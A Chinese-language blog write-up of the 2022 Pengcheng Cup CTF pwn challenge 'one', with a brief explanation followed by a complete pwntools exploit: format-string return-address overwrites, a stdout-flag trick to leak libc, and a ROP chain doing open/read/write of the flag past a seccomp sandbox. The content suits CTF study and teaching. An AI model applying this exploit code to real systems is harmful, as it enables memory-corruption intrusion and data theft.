---
layout: article
pageview: true
key: 2022-07-07-Pengcheng2022-pwn-wp
title: 鹏城杯2022初赛Pwn题WP
author: Ch4rc0al
categories: 
    - WriteUps
tags: 
    - CTF
    - Pwn
---

<!--more-->
### one
一道栈上的64位格式化字符串题目

题目环境`libc-2.31`，给了栈地址，并且通过带出垃圾数据泄露了程序基地址，之后关闭了标准输出，触发格式化字符串漏洞。

由于题目关闭了标准输出，我们一开始无法通过格式化字符串漏洞泄露任何信息，这里需要两次将`printf`的返回地址改为`start`函数来抬栈，使得恢复`_IO_2_1_stdout_`的地址，之后我们将其中的`_flags`改为2，使得标准输出重定向到标准错误输出里，这样我们就可以通过格式化字符串泄露`libc`地址，拿到`libc`地址后，我们在栈上布置rop即可。

由于题目开了沙盒，禁用了`execve`，我们需要orw在获取flag，复现时不知道为什么调用`open`函数会失败，只能调用`SYS_open`来打开文件。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64')
context.log_level = 'debug'

_elf = './pwn'
_libc = './libc-2.31.so'
_addr = ''
_port = 0

local = 1


def getConn():
    if local == 1:
        return process(_elf)
    else:
        return remote(_addr, _port)


def debug(p, cmd=None):
    if local == 1:
        gdb.attach(p, cmd)
    pause()




p = getConn()
libc=ELF(_libc)
elf=ELF(_elf)
p.recvuntil(b"gift:")
gift = int(p.recv(14), 16)
log.info(hex(gift))
addr1 = b'a'*0x8
addr2 = b'b'*0x8


p.send(addr1)
p.send(addr2)

p.recvuntil(addr1)
pie = u64(p.recv(6)+b'\x00\x00')-0x11a0
start = pie+0x11a0
log.info(hex(pie))


ret1 = gift-0x8

pay = fmtstr_payload(6, {ret1: start})
p.sendline(pay)

p.send(addr1)
p.send(addr2)


ret2 = gift-0x908

pay = fmtstr_payload(6, {ret2: start})

p.sendline(pay)


p.send(addr1)
p.send(addr2)


ret3 = gift-0x1208
num = 0


pay = fmtstr_payload(6, {ret3: start, gift-0x960: b'\x10\x87'})

p.sendline(pay)

p.send(addr1)
p.send(addr2)

ret4=gift-0x1b08
pay=(b'%%%dc%%%d$hhn'%(2,0x235+0x5))+b'aaaaa'
pay+=fmtstr_payload(8,{ret4:pie+0x148c},7)

p.sendline(pay)

ret5=ret4
pay=b'flag%265$p'+b'aaaaaa'
pay+=fmtstr_payload(8, {ret5:pie+0x148c},24)


p.sendline(pay)
p.recvuntil(b'flag')
libc_base=int(p.recv(14),16)-libc.sym['__libc_start_main']-243
log.info(hex(libc_base))


ret6=ret5

leave_ret=pie+0x000000000000133b
pop_rdi=pie+0x0000000000001543
pop_rsi=libc_base+0x000000000002604f
pop_rdx_r12=libc_base+0x0000000000119241
pop_rax=libc_base+0x0000000000047400
syscall=libc_base+0x00000000000630d9

pay=fmtstr_payload(6, {ret6:pie+0x14BE,ret6+0x818:ret6+0x140,ret6+0x820:leave_ret}).ljust(0x138,b'a')
pay+=b'./flag\x00\x00'
pay+=p64(pop_rdi)+p64(ret6+0x140)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
pay+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(pie+elf.bss()+0x500)+p64(pop_rdx_r12)+p64(0x20)*2+p64(libc_base+libc.sym['read'])
pay+=p64(pop_rdi)+p64(2)+p64(pop_rsi)+p64(pie+elf.bss()+0x500)+p64(pop_rdx_r12)+p64(0x20)*2+p64(libc_base+libc.sym['write'])

p.sendline(pay)
p.interactive()

```